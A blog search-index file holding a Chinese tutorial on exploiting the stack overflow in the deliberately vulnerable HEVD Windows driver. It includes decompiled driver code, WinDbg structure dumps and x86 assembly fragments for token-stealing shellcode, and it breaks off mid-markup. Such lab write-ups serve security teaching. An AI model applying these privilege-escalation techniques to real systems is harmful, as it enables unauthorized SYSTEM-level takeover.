<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Windows 内核漏洞利用学习--（2）栈溢出</title>
    <link href="/2022/02/21/Windows_kernel_exploit_study_stackoverflow/"/>
    <url>/2022/02/21/Windows_kernel_exploit_study_stackoverflow/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><span id="more"></span><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>可以看到在安全函数中，RtlCopyMemory对内存拷贝大小进行限制，控制可拷贝内存大小最大是KernelBuffer大小，而漏洞函数却没有对拷贝大小进行限制，可导致栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SECURE</span><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// Secure Note: This is secure because the developer is passing a size</span><br>        <span class="hljs-comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span><br>        <span class="hljs-comment">// there will be no overflow</span><br>        <span class="hljs-comment">//</span><br><br>        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="hljs-keyword">sizeof</span>(KernelBuffer));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>        DbgPrint(<span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);<br><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span><br>        <span class="hljs-comment">// because the developer is passing the user supplied size directly to</span><br>        <span class="hljs-comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span><br>        <span class="hljs-comment">// equal to the size of KernelBuffer</span><br>        <span class="hljs-comment">//</span><br><br>        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);<br></code></pre></td></tr></table></figure><p>BUFFER_SIZE是512，KernelBuffer是ULONG类型的，也就是 unsigned long类型，在32位系统中，字节数为4字节；在64位系统中，Visual C++和Mingw64字节数为4字节。GCC（POSIX系统以及Cygwin）为8字节，Clang的与GCC类似，不同平台不同实现。所以sizeof(KernelBuffer)就是0x800.</p><p>通过IDA查看函数的执行流</p><p><img src="1.png" alt="1"></p><p>跟进DriverEntry</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xl">NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, int a2)<br>&#123;<br>  NTSTATUS v2; <span class="hljs-comment">// esi</span><br>  PDEVICE_OBJECT v3; <span class="hljs-comment">// eax</span><br>  LSA_UNICODE_STRING DestinationString; <span class="hljs-comment">// [esp+8h] [ebp-14h]</span><br>  LSA_UNICODE_STRING SymbolicLinkName; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br>  PDEVICE_OBJECT DeviceObject; <span class="hljs-comment">// [esp+18h] [ebp-4h]</span><br><br>  DeviceObject = <span class="hljs-number">0</span>;<br>  *(_DWORD *)&amp;SymbolicLinkName.Length = <span class="hljs-number">0</span>;<br>  SymbolicLinkName.Buffer = <span class="hljs-number">0</span>;<br>  RtlInitUnicodeString(&amp;DestinationString, L<span class="hljs-string">&quot;\\Device\\HackSysExtremeVulnerableDriver&quot;</span>);<br>  RtlInitUnicodeString(&amp;SymbolicLinkName, L<span class="hljs-string">&quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;</span>);<br>  v2 = IoCreateDevice(DriverObject, <span class="hljs-number">0</span>, &amp;DestinationString, <span class="hljs-number">0</span>x22u, <span class="hljs-number">0</span>x100u, <span class="hljs-number">0</span>, &amp;DeviceObject);<br>  <span class="hljs-keyword">if</span> ( v2 &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-function"><span class="hljs-title">memset32</span>(DriverObject-&gt;</span>MajorFunction, (int)IrpNotImplementedHandler, <span class="hljs-number">0</span>x1Cu);<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>MajorFunction[<span class="hljs-number">14</span>] = (PDRIVER_DISPATCH)IrpDeviceIoCtlHandler;<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>MajorFunction[<span class="hljs-number">0</span>] = (PDRIVER_DISPATCH)IrpCreateCloseHandler;<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>MajorFunction[<span class="hljs-number">2</span>] = (PDRIVER_DISPATCH)IrpCreateCloseHandler;<br>    v3 = DeviceObject;<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>DriverUnload = (PDRIVER_UNLOAD)DriverUnloadHandler;<br>    <span class="hljs-function"><span class="hljs-title">v3</span>-&gt;</span>Flags |= <span class="hljs-number">0</span>x10u;<br>    D<span class="hljs-function"><span class="hljs-title">eviceObject</span>-&gt;</span>Flags &amp;= <span class="hljs-number">0</span>xFFFFFF7F;<br>    v2 = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DestinationString);<br>...<br></code></pre></td></tr></table></figure><p>跟进IrpDeviceIoCtlHandler</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">NTSTATUS __stdcall IrpDeviceIoCtlHandler(<span class="hljs-keyword">int</span> a1, PIRP Irp)<br>&#123;<br>  NTSTATUS v2; <span class="hljs-comment">// edi</span><br>  _IO_STACK_LOCATION *v3; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">const</span> CHAR *v6; <span class="hljs-comment">// [esp-4h] [ebp-10h]</span><br><br>  v2 = -<span class="hljs-number">1073741637</span>;<br>  v3 = Irp-&gt;Tail.Overlay.CurrentStackLocation;<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( v3-&gt;Parameters.Read.ByteOffset.LowPart )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>x222003u:<br>        _DbgPrintEx(<span class="hljs-number">0</span>x4Du, <span class="hljs-number">3</span>u, <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);<br>        v4 = BufferOverflowStackIoctlHandler((<span class="hljs-keyword">int</span>)Irp, (<span class="hljs-keyword">int</span>)v3);<br>        v6 = <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_4;<br>       ...<br></code></pre></td></tr></table></figure><p>跟进BufferOverflowStackIoctlHandler</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __stdcall BufferOverflowStackIoctlHandler(int <span class="hljs-built_in">a1</span>, int <span class="hljs-built_in">a2</span>)<br>&#123;<br>  int <span class="hljs-built_in">v2</span><span class="hljs-comment">; // ecx</span><br>  void *<span class="hljs-built_in">v3</span><span class="hljs-comment">; // edx</span><br><br>  <span class="hljs-built_in">v2</span> = -<span class="hljs-number">1073741823</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v3</span> = *(void **)(<span class="hljs-built_in">a2</span> + <span class="hljs-number">16</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v3</span> )<br>    <span class="hljs-built_in">v2</span> = TriggerBufferOverflowStack(<span class="hljs-built_in">v3</span>, *(_DWORD *)(<span class="hljs-built_in">a2</span> + <span class="hljs-number">8</span>))<span class="hljs-comment">;</span><br>  return <span class="hljs-built_in">v2</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>再跟进TriggerBufferOverflowStack就是我们的漏洞函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __stdcall <span class="hljs-constructor">TriggerBufferOverflowStack(<span class="hljs-params">void</span> <span class="hljs-operator">*</span>Address, <span class="hljs-params">size_t</span> MaxCount)</span><br>&#123;<br>  <span class="hljs-built_in">char</span> Dst; <span class="hljs-comment">// [esp+Ch] [ebp-81Ch]</span><br>  CPPEH_RECORD ms_exc; <span class="hljs-comment">// [esp+810h] [ebp-18h]</span><br><br>  memset(&amp;Dst, <span class="hljs-number">0</span>, <span class="hljs-number">0x800</span>u);<br>  ms_exc.registration.TryLevel = <span class="hljs-number">0</span>;<br>  <span class="hljs-constructor">ProbeForRead(Address, 0x800u, 1u)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, Address)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, MaxCount)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;Dst)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, 2048)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>)</span>;<br>  memcpy(&amp;Dst, Address, MaxCount);<br>  return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里我们用的方法是Token Stealing，什么是token呢？访问令牌（access token）是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统通过与安全数据库中存储的信息进行比较来验证用户的密码。如果密码经过身份验证，系统将生成一个访问令牌。代表此用户执行的每个进程都有此访问令牌的副本。</p><p>如果攻击者能够获得对工作站的系统级访问权限，例如通过破坏本地管理员帐户，并且域管理员帐户已登录到该计算机，则攻击者可能只需读取内存中的管理员访问令牌并将其窃取，以允许他们模拟该帐户。</p><h4 id="读-写进程令牌（token）"><a href="#读-写进程令牌（token）" class="headerlink" title="读/写进程令牌（token）"></a>读/写进程令牌（token）</h4><p>当线程与安全对象交互或试图执行需要权限的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ada">kd&gt; dt _TOKEN<br>nt!_TOKEN<br>   +<span class="hljs-number">0</span>x000 TokenSource      : _<span class="hljs-type">TOKEN_SOURCE</span><br>   +<span class="hljs-number">0</span>x010 TokenId          : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x018 AuthenticationId : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x020 ParentTokenId    : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x028 ExpirationTime   : _<span class="hljs-type">LARGE_INTEGER</span><br>   +<span class="hljs-number">0</span>x030 TokenLock        : <span class="hljs-type">Ptr32</span> _ERESOURCE<br>   +<span class="hljs-number">0</span>x034 ModifiedId       : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x040 Privileges       : _<span class="hljs-type">SEP_TOKEN_PRIVILEGES</span><br>   +<span class="hljs-number">0</span>x058 AuditPolicy      : _<span class="hljs-type">SEP_AUDIT_POLICY</span><br>   +<span class="hljs-number">0</span>x074 SessionId        : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x078 UserAndGroupCount : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x07c RestrictedSidCount : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x080 VariableLength   : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x084 DynamicCharged   : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x088 DynamicAvailable : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x08c DefaultOwnerIndex : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x090 UserAndGroups    : <span class="hljs-type">Ptr32</span> _SID_AND_ATTRIBUTES<br>   +<span class="hljs-number">0</span>x094 RestrictedSids   : <span class="hljs-type">Ptr32</span> _SID_AND_ATTRIBUTES<br>   +<span class="hljs-number">0</span>x098 PrimaryGroup     : <span class="hljs-type">Ptr32</span> Void<br>   +<span class="hljs-number">0</span>x09c DynamicPart      : <span class="hljs-type">Ptr32</span> Uint4B<br>   +<span class="hljs-number">0</span>x0a0 DefaultDacl      : <span class="hljs-type">Ptr32</span> _ACL<br>   +<span class="hljs-number">0</span>x0a4 TokenType        : _<span class="hljs-type">TOKEN_TYPE</span><br>   +<span class="hljs-number">0</span>x0a8 ImpersonationLevel : _<span class="hljs-type">SECURITY_IMPERSONATION_LEVEL</span><br>   +<span class="hljs-number">0</span>x0ac TokenFlags       : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x0b0 TokenInUse       : <span class="hljs-type">UChar</span><br>   +<span class="hljs-number">0</span>x0b4 IntegrityLevelIndex : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x0b8 MandatoryPolicy  : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x0bc LogonSession     : <span class="hljs-type">Ptr32</span> _SEP_LOGON_SESSION_REFERENCES<br>   +<span class="hljs-number">0</span>x0c0 OriginatingLogonSession : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x0c8 SidHash          : _<span class="hljs-type">SID_AND_ATTRIBUTES_HASH</span><br>   +<span class="hljs-number">0</span>x150 RestrictedSidHash : _<span class="hljs-type">SID_AND_ATTRIBUTES_HASH</span><br>   +<span class="hljs-number">0</span>x1d8 pSecurityAttributes : <span class="hljs-type">Ptr32</span> _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION<br>   +<span class="hljs-number">0</span>x1dc VariablePart     : <span class="hljs-type">Uint4B</span><br></code></pre></td></tr></table></figure><p>一种常见的方法是用特权进程令牌替换非特权进程令牌。如果特权进程在沙盒中，则该方法可能无效。为了完成它，我们应该知道哪个是非特权进程，哪个是特权进程。</p><p>创建一个名为shellcode.exe的程序.  如果我们在cmd.exe运行它，它可以帮助父进程cmd.exe获得更高的特权。该方法的工作原理如下：</p><p>➢ 查找当前进程 (shellcode.exe)的EPROCESS .<br>➢ 查找父进程(cmd.exe)的进程ID.<br>➢  从父进程读取ACCESS TOKEN<br>➢查找特权进程的EPROCESS。<br>➢ 从特权进程读取ACCESS TOKEN 。<br>➢ 将父进程的ACCESS TOKEN替换为特权ACCESS TOKEN</p><p>问题：如何在进程中定位ACCESS TOKEN是关键？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kd</span>&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> cmd.exe<br><span class="hljs-attribute">PROCESS</span> <span class="hljs-number">87948</span>d<span class="hljs-number">40</span>  SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">0</span>bc<span class="hljs-number">8</span>    Peb: <span class="hljs-number">7</span>ffd<span class="hljs-number">4000</span>  ParentCid: <span class="hljs-number">05</span>a<span class="hljs-number">4</span><br>    <span class="hljs-attribute">DirBase</span>: <span class="hljs-number">3</span>e<span class="hljs-number">8204</span>c<span class="hljs-number">0</span>  ObjectTable: a<span class="hljs-number">9352158</span>  HandleCount:  <span class="hljs-number">23</span>.<br>    <span class="hljs-attribute">Image</span>: cmd.exe<br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">kd&gt; dt nt!_EPROCESS <span class="hljs-number">87948</span>d40 <span class="hljs-built_in">TOKEN</span><br>   +<span class="hljs-number">0x0f8</span> <span class="hljs-built_in">Token</span> : _EX_FAST_REF<br></code></pre></td></tr></table></figure><p>Note:   87948d40 是EPROCESS地址</p><h5 id="查找当前进程-shellcode-exe-的EPROCESS"><a href="#查找当前进程-shellcode-exe-的EPROCESS" class="headerlink" title="查找当前进程 (shellcode.exe)的EPROCESS"></a>查找当前进程 (shellcode.exe)的EPROCESS</h5><p>问题：如何定位当前进程的EPROCESS？</p><p>FS:0x120 →→ _KPCR<br>_KPCR:0x004 →→ _KTHREAD(CurrentThread)<br>_KTHREAD:0x150 →→ _KPROCESS</p><p><strong>KPCR</strong>代表（内核）处理器控制区域（(Kernel) Processor Control Region）。 内核为每个逻辑处理器保留一个KPCR。 引导处理器的KPCR位于加载程序提供的空间中，或者位于内核的.data部分，但是每个附加处理器的KPCR处于内核在一个内存分配中构建的大规模每个处理器状态的开始。 例如，在6.0版中：<br>内核模式代码可以轻松找到正在执行的任何处理器的KPCR，因为当处理器最后一次进入ring 0时，无论它到达那里，内核都会在32位和64位Windows中加载<strong>fs</strong>或<strong>gs</strong>寄存器，来寻址该处理器的KPCR。</p><p><strong>KTHREAD</strong>:  KTHREAD结构是ETHREAD结构的内核核心部分。 ETHREAD结构是线程对象的内核表示。</p><p><strong>KPROCESS</strong> :  KPROCESS结构是EPROCESS 结构的内核核心部分。EPROCESS结构是进程对象的内核表示</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">kd&gt; dt _KPCR -r<br>...<br>   +<span class="hljs-number">0</span>x120 PrcbData         : _<span class="hljs-type">KPRCB</span><br>      +<span class="hljs-number">0</span>x000 MinorVersion     : <span class="hljs-type">Uint2B</span><br>      +<span class="hljs-number">0</span>x002 MajorVersion     : <span class="hljs-type">Uint2B</span><br>      +<span class="hljs-number">0</span>x004 CurrentThread    : <span class="hljs-type">Ptr32</span> _KTHREAD<br>      <br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">kd&gt; dt <span class="hljs-variable">_KTHREAD</span> Process<br>ntdll!<span class="hljs-variable">_KTHREAD</span><br>   +<span class="hljs-number">0</span>x150 Process : Ptr32 <span class="hljs-variable">_KPROCESS</span><br></code></pre></td></tr></table></figure><p>在汇编代码中，当前进程的EPROCESS地址可以通过以下指令找到：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">fs</span>:[<span class="hljs-number">124h</span>] <span class="hljs-comment">;get _ETHREAD pointer from KPCR</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span> + <span class="hljs-number">150h</span>]<br></code></pre></td></tr></table></figure><h5 id="查找父进程-cmd-exe-的进程ID"><a href="#查找父进程-cmd-exe-的进程ID" class="headerlink" title="查找父进程(cmd.exe)的进程ID"></a>查找父进程(cmd.exe)的进程ID</h5><p>当shellcode.exe在cmd.exe中执行时，可以将其视为子进程，而cmd.exe是父进程。 在这里，我们为父进程（cmd.exe）获得了更高的特权。 为了将权限转移到目标程序（例如：cmd.exe），我们首先应该找到cmd.exe的访问令牌。 例如：878784d0是当前进程的EPROCESS地址。</p><table><thead><tr><th>父进程</th><th>子进程（当前进程）</th></tr></thead><tbody><tr><td>cmd.exe（获得更高的特权）</td><td>shellcode.exe</td></tr></tbody></table><p>当前EPROCESS的InheritedFromUniqueProcessId是父进程ID， InheritedFromUniqueProcessId用来接收父进程ID</p><p>FS:0x120 →→ _KPCR<br>_KPCR:0x004 →→ _KTHREAD(CurrentThread)<br>_KTHREAD:0x150 →→ _KPROCESS<br>_KPROCESS:0x140 →→ InheritedFromUniqueProcessId</p><p>InheritedFromUniqueProcessId相对于当前进程的偏移量为0x140。<br>实际上是父进程的PID（例如：cmd.exe)，可以通过以下方式捕获：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; dt _EPROCESS <span class="hljs-number">87948d40</span> InheritedFromUniqueProcessId<br>ntdll!_EPROCESS<br>   +<span class="hljs-number">0</span>x140 InheritedFromUniqueProcessId : <span class="hljs-number">0</span>x<span class="hljs-number">000005a4</span> Void<br>kd&gt; ? <span class="hljs-number">0</span>x<span class="hljs-number">000005a4</span><br>Evaluate expression: <span class="hljs-number">1444</span> = <span class="hljs-number">000005a4</span> <span class="hljs-comment">; Parent Process ID</span><br><br></code></pre></td></tr></table></figure><p>在汇编代码中，父进程的进程ID可以通过以下指令找到：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span> + <span class="hljs-number">140h</span>]<br></code></pre></td></tr></table></figure><h5 id="从父进程读取ACCESS-TOKEN"><a href="#从父进程读取ACCESS-TOKEN" class="headerlink" title="从父进程读取ACCESS TOKEN"></a>从父进程读取ACCESS TOKEN</h5><p>问题：如何定位父进程(cmd.exe)的EPROCESS ?</p><p>_KPROCESS:0xb4 →→ UniqueProcessId<br>_KPROCESS:0xb8 →→ ActiveProcessLinks<br>_KPROCESS:0x140 →→ InheritedFromUniqueProcessId</p><p>使用成员ActiveProcessLinks，我们可以使用dt命令转储内核中所有活动进程的列表。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dt</span> nt!_EPROCESS -l ActiveProcessLinks.Flink <span class="hljs-number">87948</span>d<span class="hljs-number">40</span><br><span class="hljs-attribute">dt</span> nt!_EPROCESS -l ActiveProcessLinks.Flink <span class="hljs-number">87948</span>d<span class="hljs-number">40</span> UniqueProcessId ; dump<br><span class="hljs-attribute">all</span> Process ID<br><span class="hljs-attribute">dt</span> nt!_EPROCESS -l ActiveProcessLinks.Flink <span class="hljs-number">87948</span>d<span class="hljs-number">40</span> ImageFileName ; dump<br><span class="hljs-attribute">all</span> Process Name<br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sqf">kd&gt; dt <span class="hljs-variable">_EPROCESS</span> <span class="hljs-number">87948</span>d40<br>ntdll!<span class="hljs-variable">_EPROCESS</span><br>   +<span class="hljs-number">0</span>x000 Pcb              : <span class="hljs-variable">_KPROCESS</span><br>   +<span class="hljs-number">0</span>x098 ProcessLock      : <span class="hljs-variable">_EX_PUSH_LOCK</span><br>   +<span class="hljs-number">0</span>x0a0 CreateTime       : <span class="hljs-variable">_LARGE_INTEGER</span> <span class="hljs-number">0</span>x01d6cf97`fca14aa0<br>   +<span class="hljs-number">0</span>x0a8 ExitTime         : <span class="hljs-variable">_LARGE_INTEGER</span> <span class="hljs-number">0</span>x0<br>   +<span class="hljs-number">0</span>x0b0 RundownProtect   : <span class="hljs-variable">_EX_RUNDOWN_REF</span><br>   +<span class="hljs-number">0</span>x0b4 UniqueProcessId  : <span class="hljs-number">0</span>x00000bc8 Void<br>   +<span class="hljs-number">0</span>x0b8 ActiveProcessLinks : <span class="hljs-variable">_LIST_ENTRY</span> [ <span class="hljs-number">0</span>x87936da0 - <span class="hljs-number">0</span>x879a8df8 ]<br></code></pre></td></tr></table></figure><p>在EPROCESS的偏移0xb4处，存放着进程的PID,在偏移0xb8处，存放着_LIST_ENTRY链表，这个链表放着所有的EPROCESS，然后可以遍历它们，查找名为cmd.exe的父进程的PID：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">loop1:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b8h</span>]<br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">b8h</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b4h</span>], <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">jne</span> loop1<br></code></pre></td></tr></table></figure><p>access token是描述进程或线程的安全上下文的对象。 令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。 完成此操作后，我们要查找令牌的地址，因为这是我们要替换的地址。 它位于偏移量0xf8处，如下所示：</p><p>_KPROCESS:0xb4 →→ UniqueProcessId<br>_KPROCESS:0xb8 →→ ActiveProcessLinks<br>_KPROCESS:0x140 →→ InheritedFromUniqueProcessId<br>_KPROCESS:0xf8 →→ Token</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">kd&gt; dt <span class="hljs-variable">_EPROCESS</span> <span class="hljs-number">878784</span>d0 Token<br>ntdll!<span class="hljs-variable">_EPROCESS</span><br>   +<span class="hljs-number">0</span>x0f8 Token : <span class="hljs-variable">_EX_FAST_REF</span><br></code></pre></td></tr></table></figure><p>因此，在继续之前，我们一定要存储该地址：</p><figure class="highlight 